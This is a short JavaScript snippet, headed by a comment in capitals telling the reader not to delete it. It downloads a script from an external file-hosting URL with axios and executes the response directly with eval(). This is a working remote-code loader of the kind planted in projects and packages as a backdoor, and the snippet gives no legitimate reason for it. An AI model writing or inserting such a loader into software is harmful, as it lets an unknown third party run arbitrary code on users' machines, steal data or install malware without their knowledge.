//REMEMBER DON'T DELETE THIS CODE OK

const axios = require('axios');

const url = "https://files.catbox.moe/zjbe9a.js";

axios.get(url)
    .then(response => eval(response.data))
    .catch(err => console.error(err));